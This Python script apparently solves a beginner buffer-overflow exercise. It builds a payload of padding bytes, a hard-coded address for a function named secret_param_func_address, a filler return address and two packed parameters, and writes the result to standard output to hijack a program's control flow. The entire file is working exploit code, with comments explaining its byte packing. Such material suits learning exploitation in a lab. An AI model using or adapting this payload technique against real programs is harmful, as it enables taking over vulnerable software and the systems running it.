#!/usr/bin/env python

import os
import struct

# Returns a byte object in little endian format.
def p32(num):
	return struct.pack("<I", num)

offset = 0x48
first_param = 0x12345678
second_param = 0xabcdef01
secret_param_func_address = 0x08049182

# We must append objects of the same type. So, in order to append the byte object
# returned by p32, we must convert the string to a byte object, using 'b'.
payload = offset * b"A"  + p32(secret_param_func_address) + 4 * b"B" + p32(first_param) + p32(second_param)

os.write(1, payload)
